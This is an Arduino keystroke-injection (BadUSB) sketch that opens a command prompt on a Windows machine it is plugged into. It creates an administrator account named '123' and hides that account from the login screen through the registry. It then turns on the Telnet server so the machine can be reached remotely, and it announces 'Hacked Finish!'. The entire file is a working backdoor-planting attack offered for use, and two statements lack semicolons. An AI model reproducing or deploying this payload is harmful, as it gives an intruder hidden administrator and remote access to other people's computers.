void setup() {
  delay(5000);
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.print('r');
  Keyboard.release(KEY_LEFT_GUI);
  delay(500);
  Keyboard.println("cmd");
  delay(500);
  Keyboard.println("color a&&cls");
  Keyboard.println("net user 123 123 /add");
  delay(500);
  Keyboard.println("net localgroup administrators 123 /add&&reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v 123 /d 0 /t REG_DWORD /f&&reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\" /v NTLM /d 0 /t REG_DWORD /f&&reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"forceguest\" /t REG_DWORD /d 0 /f");
  delay(1000);
  Keyboard.println("sc config tlntsvr start= auto");
  delay(500);
  Keyboard.println("net start telnet");
  delay(500)
  Keyboard.println("cls&&echo Hacked Finish!");
  Keyboard.end()
}
void loop() {
}
